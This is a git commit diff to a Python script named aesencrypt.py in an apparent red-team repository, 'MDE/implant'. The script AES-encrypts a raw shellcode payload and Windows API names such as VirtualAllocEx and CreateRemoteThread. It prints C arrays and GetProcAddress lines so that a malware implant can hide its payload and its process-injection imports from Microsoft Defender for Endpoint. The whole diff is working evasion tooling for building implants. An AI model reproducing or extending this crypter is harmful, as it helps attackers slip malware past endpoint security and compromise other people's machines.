d51d937e85ef199eddc9f6d6ea9c0ad9a4a2c512
p.load <57832389+p4yl0ad@users.noreply.github.com>
2021-08-30 13:51:54 +0100

    Update aesencrypt.py

--- MDE/implant/aesencrypt.py
+++ MDE/implant/aesencrypt.py
@@ -5,110 +5,68 @@
 #
 # Heavily modified by: p4yl0ad
 #
-#
 # Check out sektor7
 
-
-
-import sys, re, hashlib
+import sys, re
 from Crypto.Cipher import AES
 from os import urandom
+import hashlib
+
+
 
 def pad(s):
 	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
 
 def aesenc(plaintext, key):
+
 	k = hashlib.sha256(key).digest()
 	iv = 16 * '\x00'
 	plaintext = pad(plaintext)
 	cipher = AES.new(k, AES.MODE_CBC, iv)
+
 	return cipher.encrypt(bytes(plaintext))
 
 
+try:
+    plaintext = open(sys.argv[1], "rb").read()
+except:
+    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    sys.exit()
+
+
+KEY = urandom(16)
+ciphertext = aesenc(plaintext, KEY)
+print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
+print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
 
 def getcap(word):
     r = re.findall("([A-Z])", word)
     return ("".join (x for x in r) + word[len(word)-1])
-    
 
-def printunsigned(alias, keyname, ciphertext):
-    print('unsigned char ' + alias + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
-    print('AESDecrypt((char *) '+alias+', sizeof('+alias+'), '+keyname+', sizeof('+keyname+'));')
-    
+def keyloops():
+    with open("kekapi.txt", 'r+') as kapi:
+        for i, e in enumerate(kapi):            
+            LOOPKEY = urandom(16)
+            #get first 3 characters + all capitals
+            prepend = (e.rstrip("\n")[0:3] + getcap(e.rstrip("\n")))
+            print("unsigned char " + "k" + prepend + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in LOOPKEY) + ' };')
+            print("unsigned char " + "s" + prepend + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in e.rstrip("\n")) + ' };')
+            #unsigned char kVAEx[] = { 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36 };
+            #unsigned char sVAEx[] = { 0x3c, 0xb5, 0x6f, 0xac, 0x69, 0xb3, 0x6d, 0x18, 0x59, 0x7f, 0xcc, 0xc1, 0x4e, 0x8c, 0x39, 0xd6 };
+            print("AESDecrypt((char *) "+"s" + prepend+", sizeof("+"s" + prepend+"), "+"k" + prepend+", sizeof("+"k" + prepend+"));")
+            #AESDecrypt((char *) sVAEx, sizeof(sVAEx), kVAEx, sizeof(kVAEx));
+            print("p" + prepend + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\")," + "s" + prepend + ");")
+            #pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVAEx);
 
-def createpointerstring(alias, alias2): # sVAc , sk32
-    #pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAlloc);
-    print("TEST")
-    print("p" + alias + " = GetProcAddress(GetModuleHandle(" + "s" + alias2 + "), " + "s" + alias + ");")
-        
 
-    
 
-def obfus(ToObfus):
-    
-    
-    # Good example 
-    # CreateRemoteThread
-    #unsigned char sCRTk[] = { 0x27, 0xfc, 0xf1, 0xbb, 0xfc, 0xd1, 0xb2, 0xe9, 0x10, 0x7f, 0xa9, 0xba, 0x9b, 0xa9, 0x43, 0x2f };
-    #unsigned char sCRT[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 };
-	#AESDecrypt((char *) sCRT, sizeof(sCRT), sCRTk, sizeof(sCRTk));
-    
-    # kernel32.dll
-    #unsigned char k32k[] = { 0x27, 0xfc, 0xf1, 0xbb, 0xfc, 0xd1, 0xb2, 0xe9, 0x10, 0x7f, 0xa9, 0xba, 0x9b, 0xa9, 0x43, 0x2f };
-    #unsigned char k32[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74 };
-    #AESDecrypt((char *) k32, sizeof(k32), k32k, sizeof(k32k));
-	#pCRT = GetProcAddress(GetModuleHandle(k32), sCRT);
-    
-    print("")
-    KEY = urandom(16)
-    alias = getcap(ToObfus)
-    keyname = alias + "k"
-    printkey(KEY, keyname)
-    ciphertext = aesenc(ToObfus, KEY)
-    Salias = "s" + alias
-    printunsigned(Salias, keyname, ciphertext)
 
-    KEY2 = urandom(16)
-    alias2 = 'k32'
-    keyname2 = alias2 + "k"
-    printkey(KEY2, keyname2)
-    
-    libname = "kernel32.dll"
-    ciphertext2 = aesenc(libname, KEY2)
-    
-    Salias2 = "s" + alias2
-    printunsigned(Salias2, keyname2, ciphertext2)
-    
-    createpointerstring(alias, alias2) # sVAc , sk32
- 
- 
-def libcalls(libAlias):
-    if libAlias == "k":
-        obfus("kernel32.dll")
-        
-        
-    elif libAlias == "n":
-        obfus("Ntdll.dll")
-        
-        
- 
-def printkey(KEY, keyname):
-    print('unsigned char ' + keyname + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
-    
-    
-if __name__ == '__main__':
-    try:
-        plaintext = open(sys.argv[1], "rb").read()
-        payloadkey = urandom(16)
-        ciphertext = aesenc(plaintext, payloadkey)
-        print(printkey(payloadkey,"pke"))
-        print('unsigned char payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
-        
-        
-        
-        obfus("VirtualAlloc")
-        
-    except Exception as e:
-        #print(e)
-        print("File argument needed! %s <raw payload file>" % sys.argv[0])
-        sys.exit()
+#KEY2 = "1234567890123456"
+#ciphertext2 = aesenc("VirtualAllocEx\x00", KEY2)
+#print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY2) + ' };')
+#print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext2) + ' };')
+
+
+if __name__ == "__main__":
+    keyloops()
+  
